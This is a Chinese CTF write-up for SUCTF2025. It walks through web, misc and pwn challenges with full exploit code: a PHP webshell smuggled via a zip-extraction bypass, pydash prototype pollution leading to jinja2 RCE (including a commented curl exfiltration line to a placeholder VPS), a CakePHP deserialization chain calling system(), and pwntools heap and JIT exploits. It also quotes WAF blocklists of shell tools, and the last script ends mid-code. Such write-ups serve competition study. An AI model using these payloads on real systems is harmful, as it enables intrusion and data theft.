---
title: SUCTF2025
date: 2025-01-15
---

# 目录

# Web

## SU_photogallery

php ＜= 7 . 4 . 21 development server 源码泄露漏洞

读取 unzip.php

```php
<?php
error_reporting(0);

function get_extension($filename)
{
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename, $path)
{
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;

    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            if (!unlink($filePath)) {
                // echo "Fail to delete file: $filename\n";
                return false;
            } else {
                // echo "This file format is not supported:$extension\n";
                return false;
            }
        } else {
            return true;
        }
    } else {
        // echo "nofile";
        return false;
    }
}
function file_rename($path, $file)
{
    $randomName = md5(uniqid() . rand(0, 99999)) . '.' . get_extension($file);
    $oldPath = $path . DIRECTORY_SEPARATOR . $file;
    $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

    if (!rename($oldPath, $newPath)) {
        unlink($path . DIRECTORY_SEPARATOR . $file);
        // echo "Fail to rename file: $file\n";
        return false;
    } else {
        return true;
    }
}

function move_file($path, $basePath)
{
    foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)) {
            // echo "Fail to rename file: $file\n";
            return false;
        }
    }
    return true;
}

function check_base($fileContent)
{
    $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars', 'info'];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword) !== false) {
            return true;
        } else {
            return false;
        }
    }
}

function check_content($zip)
{
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (preg_match('/\.\.(\/|\.|%2e%2e%2f)/i', $fileName)) {
            return false;
        }
        // echo "Checking file: $fileName\n";
        $fileContent = $zip->getFromName($fileName);

        if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
            // echo "Don't hack me!\n";
            return false;
        } else {
            continue;
        }
    }
    return true;
}

function unzip($zipname, $basePath)
{
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo "Zip file does not exist";
        return "zip_not_found";
    }
    if (!$zip->open($zipname)) {
        // echo "Fail to open zip file";
        return "zip_open_failed";
    }
    if (!check_content($zip)) {
        return "malicious_content_detected";
    }
    $randomDir = 'tmp_' . md5(uniqid() . rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo "Fail to create directory";
        $zip->close();
        return "mkdir_failed";
    }
    if (!$zip->extractTo($path)) {
        // echo "Fail to extract zip file";
        $zip->close();
    }
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (!check_extension($fileName, $path)) {
            // echo "Unsupported file extension";
            continue;
        }
        if (!file_rename($path, $fileName)) {
            // echo "File rename failed";
            continue;
        }
    }
    if (!move_file($path, $basePath)) {
        $zip->close();
        // echo "Fail to move file";
        return "move_failed";
    }
    rmdir($path);
    $zip->close();
    return true;
}

$uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES['file'];
    $zipname = $uploadedFile['tmp_name'];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header("Location: index.html?status=success");
        exit();
    } else {
        header("Location: index.html?status=$result");
        exit();
    }
} else {
    header("Location: index.html?status=file_error");
    exit();
}
```

当压缩包中的文件名字过长时$zip->extractTo会返回false,但是已经正常解压出的文件会保留，同时$zip 会关闭，这就使得$zip->numFiles 为 0，从而绕过后面的检测和改名字。解压的文件就可以原先的名字在 upload/suimages/中进行访问。上传马只需要拼接绕过关键字即可

```python
import zipfile

file_to_add = 'test.php'
zip_filename = 'test1.zip'

with zipfile.ZipFile(zip_filename, 'w') as zipf:
    zipf.write(file_to_add, arcname="aa123.php")
    zipf.write(file_to_add, arcname="1"*2000+".txt")
<?php
$a='sys'.'tem';
$a($_POST['aaaaa']);
```

## SU_blog

随便注册一个账号登录发现可以读取 article，但是其他的文件读不了，尝试注册 admin（竟然可以直接注册），虽然也可以爆破一下 secret_key，登录多了一个管理友链的接口。再次尝试/article 读文件，这次显示的和之前不一样，之前是没有权限，现在是读不到。尝试目录穿越，发现构造 file=articles/../articles/article1.txt 读取不到文件，猜测可能是对../进行 replace，双写绕过后读取到源代码。

app.py

```python
from flask import *
import time,os,json,hashlib
from pydash import set_
from waf import pwaf,cwaf

app = Flask(__name__)
app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {"testuser": "password"}
BASE_DIR = '/var/www/html/myblog/app'

articles = {
    1: "articles/article1.txt",
    2: "articles/article2.txt",
    3: "articles/article3.txt"
}

friend_links = [
    {"name": "bkf1sh", "url": "https://ctf.org.cn/"},
    {"name": "fushuling", "url": "https://fushuling.com/"},
    {"name": "yulate", "url": "https://www.yulate.com/"},
    {"name": "zimablue", "url": "https://www.zimablue.life/"},
    {"name": "baozongwi", "url": "https://baozongwi.xyz/"},
]

class User():
    def __init__(self):
        pass

user_data = User()
@app.route('/')
def index():
    if 'username' in session:
        return render_template('blog.html', articles=articles, friend_links=friend_links)
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials", 403
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        users[username] = password
        return redirect(url_for('login'))
    return render_template('register.html')


@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    if 'username' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        old_password = request.form['old_password']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if users[session['username']] != old_password:
            flash("Old password is incorrect", "error")
        elif new_password != confirm_password:
            flash("New passwords do not match", "error")
        else:
            users[session['username']] = new_password
            flash("Password changed successfully", "success")
            return redirect(url_for('index'))

    return render_template('change_password.html')


@app.route('/friendlinks')
def friendlinks():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))
    return render_template('friendlinks.html', links=friend_links)


@app.route('/add_friendlink', methods=['POST'])
def add_friendlink():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))

    name = request.form.get('name')
    url = request.form.get('url')

    if name and url:
        friend_links.append({"name": name, "url": url})

    return redirect(url_for('friendlinks'))


@app.route('/delete_friendlink/<int:index>')
def delete_friendlink(index):
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))

    if 0 <= index < len(friend_links):
        del friend_links[index]

    return redirect(url_for('friendlinks'))

@app.route('/article')
def article():
    if 'username' not in session:
        return redirect(url_for('login'))

    file_name = request.args.get('file', '')
    if not file_name:
        return render_template('article.html', file_name='', content="未提供文件名。")

    blacklist = ["waf.py"]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template('article.html', file_name=file_name, content="大黑阔不许看")

    if not file_name.startswith('articles/'):
        return render_template('article.html', file_name=file_name, content="无效的文件路径。")

    if file_name not in articles.values():
        if session.get('username') != 'admin':
            return render_template('article.html', file_name=file_name, content="无权访问该文件。")

    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace('../', '')

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except FileNotFoundError:
        content = "文件未找到。"
    except Exception as e:
        app.logger.error(f"Error reading file {file_path}: {e}")
        content = "读取文件时发生错误。"

    return render_template('article.html', file_name=file_name, content=content)


@app.route('/Admin', methods=['GET', 'POST'])
def admin():
    if request.args.get('pass')!="SUers":
        return "nonono"
    if request.method == 'POST':
        try:
            body = request.json

            if not body:
                flash("No JSON data received", "error")
                return jsonify({"message": "No JSON data received"}), 400

            key = body.get('key')
            value = body.get('value')

            if key is None or value is None:
                flash("Missing required keys: 'key' or 'value'", "error")
                return jsonify({"message": "Missing required keys: 'key' or 'value'"}), 400

            if not pwaf(key):
                flash("Invalid key format", "error")
                return jsonify({"message": "Invalid key format"}), 400

            if not cwaf(value):
                flash("Invalid value format", "error")
                return jsonify({"message": "Invalid value format"}), 400

            set_(user_data, key, value)

            flash("User data updated successfully", "success")
            return jsonify({"message": "User data updated successfully"}), 200

        except json.JSONDecodeError:
            flash("Invalid JSON data", "error")
            return jsonify({"message": "Invalid JSON data"}), 400
        except Exception as e:
            flash(f"An error occurred: {str(e)}", "error")
            return jsonify({"message": f"An error occurred: {str(e)}"}), 500

    return render_template('admin.html', user_data=user_data)


@app.route('/logout')
def logout():
    session.pop('username', None)
    flash("You have been logged out.", "info")
    return redirect(url_for('login'))



if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```

waf.py

```python
key_blacklist = [
    '__file__', 'app', 'router', 'name_index',
    'directory_handler', 'directory_view', 'os', 'path', 'pardir', '_static_folder',
    '__loader__', '0',  '1', '3', '4', '5', '6', '7', '8', '9',
]

value_blacklist = [
    'ls', 'dir', 'nl', 'nc', 'cat', 'tail', 'more', 'flag', 'cut', 'awk',
    'strings', 'od', 'ping', 'sort', 'ch', 'zip', 'mod', 'sl', 'find',
    'sed', 'cp', 'mv', 'ty', 'grep', 'fd', 'df', 'sudo', 'more', 'cc', 'tac', 'less',
    'head', '{', '}', 'tar', 'zip', 'gcc', 'uniq', 'vi', 'vim', 'file', 'xxd',
    'base64', 'date', 'env', '?', 'wget', '"', 'id', 'whoami', 'readflag'
]

# 将黑名单转换为字节串
key_blacklist_bytes = [word.encode() for word in key_blacklist]
value_blacklist_bytes = [word.encode() for word in value_blacklist]

def check_blacklist(data, blacklist):
    for item in blacklist:
        if item in data:
            print(item)
            return False
    return True

def pwaf(key):
    # 将 key 转换为字节串
    key_bytes = key.encode()
    if not check_blacklist(key_bytes, key_blacklist_bytes):
        print(f"Key contains blacklisted words.")
        return False
    return True

def cwaf(value):
    if len(value) > 77:
        print("Value exceeds 77 characters.")
        return False

    # 将 value 转换为字节串
    value_bytes = value.encode()
    if not check_blacklist(value_bytes, value_blacklist_bytes):
        print(f"Value contains blacklisted words.")
        return False
    return True
```

很明显 pydash 是原型链污染，本来想先把 waf 给清空，但是因为会直接对 key 和 value 进行 encode 操作，所有 key 和 value 只能是 str 类型的。使用 article 尝试读取/flag 发现没有权限，猜测应该是要进行 RCE。这里使用 jinja2 在 CodeGenerator 类的 visit_Template 中会拼接 runtime 的 exported，只有污染了 exported 就可以执行任意的 python 语句从而实现 RCE。

这里的 exported 是一个 list 类型，pydash 必须要使用数字索引进行赋值，但是当时看到 waf 里的黑名单想当然以为所有数字都被过滤了，浪费了很多时间。

这里必须要在容器重启后先进行污染，然后在访问任意一个渲染模版的路由

```python
import requests

url = "http://27.25.151.48:10004/Admin?pass=SUers"
data={
    "key":"__init__.__globals__.json.__spec__.loader.__init__.__globals__.sys.modules.jinja2.runtime.exported.2",
    "value":"Markup;__import__('os').system('/read\'\'f\'\'lag > a');#"
    # "value":"Markup;__import__('os').system('curl http://vps:port/`ca\'\'t a`');#"
}

res=requests.post(url,json=data)
print(res.text)

#SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}
```

## SU_POP

cakephp 最新版的反序列化，先找入口

vendor/react/promise/src/Internal/RejectedPromise.php \_\_destruct()方法

$this->reason 可控，存在字符串拼接，可以触发 \_\_toString 方法

![img](/images/SUCTF2025/img01.png)

然后根据之前已经被发现的链子，vendor/cakephp/cakephp/src/ORM/Table.php 中的**call 方法可以执行任意类的方法，只是参数不一定可控。所以现在要找到一个可以触发**call 的方法

在 vendor/phpstan/phpdoc-parser/src/Ast/Type/ConstTypeNode.php 的**toString 方法，因为$this->constExpr 可控，同时 Table 类没有**toString 方法，可以触发\_\_call

![img](/images/SUCTF2025/img02.png)

这里 this->\_behaviors 可控，跟进 hashMethod，this->\_methodMap 可控

![img](/images/SUCTF2025/img03.png)

![img](/images/SUCTF2025/img04.png)

再跟进 call 方法，this->has 方法，这里$this->\_loaded 都是可控的，最后可以执行任意类的任意无参方法

![img](/images/SUCTF2025/img05.png)

![img](/images/SUCTF2025/img06.png)

接着只需要再找一个合适的类进行命令执行就好了。

vendor/mobiledetect/mobiledetectlib/src/MobileDetect.php 的 isMobile 方法，没有参数，跟进 this->hashUserAgent()和 this->isUserAgentEmpty()，只需设置 this->userAgent 不为空字符串就可以

![img](/images/SUCTF2025/img07.png)

![img](/images/SUCTF2025/img08.png)

接下来跟进到$this->createCacheKey("mobile")，最后的call_user_func中的$cacheKeyFn 是$this->config['cacheKeyFn']可控，参数$cacheKey 是将$key，$userAgentKey，$httpHeadersKey拼接在一起，这里控制中间的$userAgentKey，令$this->config['cacheKeyFn']为system，$userAgentKey 为前后用分号隔开实现命令执行

![img](/images/SUCTF2025/img09.png)

最后使用 find suid 提权读取 flag

Poc

```php
<?php

namespace Detection;
class MobileDetect
{
    protected $userAgent=";find /tmp -type f -name '*.txt' -exec cat /flag.txt \\;;";
    protected $httpHeaders=[];
    protected $config=[

        'autoInitOfHttpHeaders' => true,

        'maximumUserAgentLength' => 500,

        'cacheKeyFn' => 'system',

        'cacheTtl' => 86400,
    ];

}

namespace Cake\Core;
abstract class ObjectRegistry
{
    protected $_loaded = [];

}

namespace Cake\ORM;
use Cake\Core\ObjectRegistry;
class BehaviorRegistry extends ObjectRegistry
{
    protected $_methodMap = [];
    public function __construct()
    {
        $this->_methodMap = ["__tostring"=>["MobileDetect","isMobile"]];
        $this->_loaded=["MobileDetect"=>new \Detection\MobileDetect()];
    }

}

namespace Cake\ORM;
class Table{
    protected $_behaviors;

    public function __construct()
    {
        $this->_behaviors = new \Cake\ORM\BehaviorRegistry();
    }

}

namespace phpStan\PhpDocParser\Ast\Type;
class ConstTypeNode {
    public $constExpr;

    public function __construct()
    {
        $this->constExpr = new \Cake\ORM\Table();
    }
}

namespace React\Promise\Internal;
final class RejectedPromise{
    private $reason;
    public function __construct()
    {
        $this->reason = new \phpStan\PhpDocParser\Ast\Type\ConstTypeNode();
    }
}

$a=new \React\Promise\Internal\RejectedPromise();
// echo serialize($a)."\n";
echo base64_encode(serialize($a))."\n";
```

# Misc

## SU_checkin

暂时无法在飞书文档外展示此内容

![img](/images/SUCTF2025/img10.png)

PBEWithMD5AndDES 加密，密文与密钥如下

![img](/images/SUCTF2025/img11.png)

![img](/images/SUCTF2025/img12.png)

这个密钥长度应该是 23？SePassWordLen23SUCT，后面应该是 SUCTF，还差三位爆破一下

```java
package ufo;

import org.jasypt.util.text.BasicTextEncryptor;

public class PBEWITHMD5andDES_Test {
    private static final String PASSWORD = "SePassWordLen23SUCTF"; // 用于加密和解密的密码

    public static void main(String[] args) {


        String encryptedText="ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=";
        // 解密
        char[] charsToTry = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();
        for (char a :charsToTry){
            System.out.println();
            for (char b :charsToTry){
                for (char c :charsToTry){
                    BasicTextEncryptor textEncryptor = new BasicTextEncryptor();
                    textEncryptor.setPassword(PASSWORD+a+b+c);
                    try {
                        String decryptedText = textEncryptor.decrypt(encryptedText);
                        if (decryptedText.contains("SUCTF")){
                            System.out.println("password: " + PASSWORD+a+b+c);
                            System.out.println("Decrypted Text: " + decryptedText);
                        }

                    }catch (Exception e){}
                }
            }
        }

    }
}
```

## SU_forensics

ubuntu 改密码，更改用户 bkfish 密码

Diskgenius 直接读取虚拟磁盘文件.vmdx，以免安装 extundelete 时覆盖数据，得到敏感数据：

```python
echo "My secret has disappeared from this space and time, and you will never be able to find it."
curl -s -o /dev/null https://www.cnblogs.com/cuisha12138/p/18631364
sudo reboot
```

暂时无法在飞书文档外展示此内容

用时光机

https://webcf.waybackmachine.org/web/20241225122922/https://www.cnblogs.com/cuisha12138/p/18631364

https://github.com/testtttsu/homework/blob/main/homework.py

这个打码能去么，password 那里

![img](/images/SUCTF2025/img13.png)

![img](/images/SUCTF2025/img14.jpeg)

苹果马赛克，2phxMo8iUE2bAVvdsBwZ

![img](/images/SUCTF2025/img15.png)

找到 commit id，https://api.github.com/repos/testtttsu/homework/activity

https://github.com/testtttsu/homework/commit/a4be9c81ae540340f3e208dc9b1ee109ea50305c

解完是

![img](/images/SUCTF2025/img16.png)

python 拆一下,138\*108 大小。

然后字母频率，解完像加密过的，丢进去解出来一段话。搜第一句在网上搜出来“全字母句”

![img](/images/SUCTF2025/img17.png)

```python
import string

# 给定的句子
text = """
A QUICK ZEPHYR BLOW VEXING DAFT JIM
FRED SPECIALIZED IN THE JOB OF MAKING VERY QABALISTIC WAX TOYS
SIX FRENZIED KINGS VOWED TO ABOLISH MY QUITE PITIFUL JOUSTS
MAY JOE QUAL MY FOOLISH RECORD BY SOLVING SIX PUZZLES A WEEK
HARRY IS JOGGING QUICKLY WHICH AXED ZEN MONKS WITH ABUNDANT VAPOR
DUMPY KIBITZER JINGLES AS QUIXOTIC OVERFLOWS
NYMPH SING FOR QUICK JIGS VEX BUD IN ZESTFUL TWILIGHT
SIMPLE FOX HELD QUARTZ DUCK JUST BY WINGS
STRONG BRICK QUIZ WHANGS JUMPY FOX VIVIDLY
GHOSTS IN MEMORY PICK UP QUARTZ AND VALUABLE ONYX JEWELS
PENSIVE WIZARDS MAKE TOXIC BREW FOR THE EVIL QATAR I KING AND WRY JACKAL
OUTDATED QUERY ASKED BY FIVE WATCH EXPERTS AMAZED THE JUDGE
"""

# 定义字母表
alphabet = set(string.ascii_uppercase)

# 函数：统计每行缺少的字母

def find_missing_letters(text):
    lines = text.splitlines()
    missing_letters_per_line = []

    for line in lines:
        # 去掉空格，转换为大写
        line_letters = set(line.replace(" ", "").upper())

        # 计算缺失的字母
        missing_letters = alphabet - line_letters
        missing_letters_per_line.append(sorted(missing_letters))

    return missing_letters_per_line

# 统计每行缺少的字母
missing_letters = find_missing_letters(text)

# 输出每行缺少的字母
for i, missing in enumerate(missing_letters):
    print(f"Line {i + 1}: Missing letters: {''.join(missing)}")
```

![img](/images/SUCTF2025/img18.png)

# PWN

## Jit

test 操作处有下标溢出，可以访问到 jmp addr+0x13,从而可以通过值输入构造出 syscall。执行 mprotect 和 execve

```python
#! /usr/bin/python3
from pwn import *
#pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf=ELF("./chall")
# libc=ELF("./libc.so.6")

debug = 0

if debug:
    io = process('./chall')
    #io = remote('0.0.0.0',9999)
else:
    io = remote('1.95.131.201',10001)

def p():
    gdb.attach(proc.pidof(io)[0])

payload=b""

# push r8
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x41\x50"

# pop rdi
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x5f\xf8"

# mov ax,0x1000
payload+=b"\x01\x00\x00\x01"

# push rax
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x50\xf8"

# pop rsi
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x5e\xf8"

# mov ax,0x1000
payload+=b"\x01\x00\x0a\x00"

# mov dx,0x1000
payload+=b"\x01\x33\x07\x00"

# syscall
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x0f\x05"

# mov ax,
payload+=b"\x01\x00\x00\x00"
# mov bx,
payload+=b"\x01\x11\x2F\x62"
# mov [r8+ax],bx
payload+=b"\x71\x01\x00\x01"

# mov ax,
payload+=b"\x01\x00\x02\x00"
# mov bx,
payload+=b"\x01\x11\x69\x6e"
# mov [r8+ax],bx
payload+=b"\x71\x01\x00\x01"

# mov ax,
payload+=b"\x01\x00\x04\x00"
# mov bx,
payload+=b"\x01\x11\x2f\x73"
# mov [r8+ax],bx
payload+=b"\x71\x01\x00\x01"

# mov ax,
payload+=b"\x01\x00\x06\x00"
# mov bx,
payload+=b"\x01\x11\x68\x00"
# mov [r8+ax],bx
payload+=b"\x71\x01\x00\x01"

# mov dx,0x1000
payload+=b"\x01\x33\x00\x00"

# push rdx
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x52\xf8"

# pop rsi
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x5e\xf8"

# mov ax,
payload+=b"\x01\x00\x3b\x00"

# syscall
payload+=b"\x44\x44\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x44\x33\x0f\x05"
payload+=b"\x01\x00\x0f\x05"

io.recvuntil("Input ur code:\n")
# p()
io.send(payload)

io.interactive()
```

## SU_text

house of husk 执行 exit

house of apple2 进行 io-file 攻击

```python
# house of husk + house of apple2

#! /usr/bin/python3
from pwn import *
#pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf=ELF("./SU_text")
libc=ELF("./libc.so.6")

debug = 0

if debug:
    io = process('./SU_text')
    #io = remote('0.0.0.0',9999)
else:
    io = remote('1.95.76.73',10010)

payload=b""

def p():
    gdb.attach(proc.pidof(io)[0])

def add(idx,size):
    global payload
    payload+=b"\x01\x10"+idx.to_bytes(1, byteorder='little')
    payload+=size.to_bytes(4, byteorder='little')

def free(idx):
    global payload
    payload+=b"\x01\x11"+idx.to_bytes(1, byteorder='little')

def arbwrite(idx,vlue1,vlue2,times,offset,vlue4):
    global payload
    payload+=b"\x02"+idx.to_bytes(1, byteorder='little')
    for i in range(times):
        payload+=b"\x11\x12"+vlue1.to_bytes(4, byteorder='little')
        payload+=vlue2.to_bytes(4, byteorder='little')
    payload+=b"\x10\x14"+offset.to_bytes(4, byteorder='little')
    payload+=vlue4.to_bytes(8, byteorder='little')
    payload+=b'\x00'

def arbread(idx,vlue1,vlue2,times,offset,offset2):
    global payload
    payload+=b"\x02"+idx.to_bytes(1, byteorder='little')
    for i in range(times):
        payload+=b"\x11\x12"+vlue1.to_bytes(4, byteorder='little')
        payload+=vlue2.to_bytes(4, byteorder='little')
    payload+=b"\x10\x15"+offset.to_bytes(4, byteorder='little')+b'a'*8
    payload+=b"\x10\x16"+offset2.to_bytes(4, byteorder='little')
    payload+=b'\x00'

def exit0():
    global payload
    payload+=b"\x04"    # b *$rebase(0x20A9 )

def continue0():
    global payload
    payload+=b"\x03"    # b *$rebase(0x20A9 )

add(0,0x440)
add(1,0x450)
add(2,0x440)
add(3,0x440)
free(1)
add(4,0x480)
add(5,0x490)
add(6,0x480)
add(7,0x480)
free(5)
add(8,0x4c0)
add(9,0x4d0)
add(10,0x4c0)
add(11,0x4c0)
free(9)
add(12,0x4f0)

arbread(0,1,1,4*0x10,0x368,0xfffffff2)   #next_size
# arbwrite(0,1,1,4*0x10,0x368,111)   #next_size
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

heap_base=u64(io.recv(8))-0x6e0
print("heap_base="+hex(heap_base))

payload=b""
arbread(0,1,1,4*0x10,0x358,0xfffffff2)   #next_size
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

libc_base=u64(io.recv(8))-0x203f20
print("libc_base="+hex(libc_base))
# sleep(0.5)
# p()

payload=b""
tar=libc_base+0x47b90
# arbwrite(6,1,1,4*0x40,0x3a0,tar)   #next_size
arbwrite(7,1,1,0,0x310,tar)
continue0()
# exit0()
io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)
# p()

###    模板（有沙盒保护）
lock = heap_base+0x800
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
pop_rax=libc_base+0x00000000000dd237
pop_rdi=libc_base+0x000000000010f75b
pop_rsi_rbp=libc_base+0x000000000002b46b
pop_rdx_leave=libc_base+0x000000000009819d
leave_ret =libc_base + libc.search(asm('leave;ret;')).__next__()
ret=libc_base+0x11BA69
chunk5_addr=heap_base+0x34b0
orw_addr=chunk5_addr + 0xe0 + 0xe8 + 0x70
wfile=libc.symbols["_IO_wfile_jumps"]+libc_base
magic_gadget=libc_base+0x17923D
magic2=libc_base+0x5814D

#_IO_FILE_plus
fake_file=p64(0)*7
fake_file+=p64(orw_addr)
fake_file+=p64(0)*7
fake_file+=p64(lock)    #lock
fake_file+=p64(0)*2
fake_file+=p64(chunk5_addr + 0xe0)
fake_file+=p64(0)*6
fake_file+=p64(wfile)
#_IO_wide_data
fake_file+=p64(0)*0x1c
fake_file+=p64(chunk5_addr + 0xe0 + 0xe8)
#_IO_jump_t
fake_file+=p64(0)*0xd
fake_file+=p64(magic_gadget)

add_rsp18=libc_base+0x000000000010ecaf
syscall=libc_base+0x11BA5F

# orw = b'./flag\x00\x00'+p64(add_rsp18)+p64(0) #3.add rsp, 0x18 ; ret
# orw += p64(orw_addr-0x8) #1.指向leave_ret的地址
# #close
# orw += p64(leave_ret) #2.迁移后指向add_rsp18的地址
# #open
# orw += p64(pop_rdi)
# orw += p64(orw_addr)
# orw += p64(pop_rsi_rbp) + p64(0)+ p64(0)
# orw += p64(pop_rax) + p64(2)
# orw += p64(syscall)
# #read
# orw += p64(pop_rdi) + p64(0)
# orw += p64(pop_rsi) + p64(orw_addr + 0x100)
# orw += p64(pop_rdx12) + p64(0x50) + p64(ret)*0x19
# orw += p64(read_addr)
# #puts
# orw += p64(pop_rdi) + p64(1)
# orw += p64(pop_rsi) + p64(orw_addr + 0x100)+ p64(0)
# orw += p64(pop_rdx12) + p64(0x50) + p64(ret)*0x19
# orw += p64(write_addr)

# fake_file+=orw

payload=b""
arbwrite(11,1,1,0,0x58-0x40,1)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x78-0x40,orw_addr)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0xb8-0x40,lock)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0xd0-0x40,chunk5_addr + 0xe0)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x108-0x40,wfile)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x1f0-0x40,chunk5_addr + 0xe0 + 0xe8)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x260-0x40,magic_gadget)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

# orw

payload=b""
arbwrite(11,1,1,0,0x268-0x40,0x000067616C662F2E)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x270-0x40,add_rsp18)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
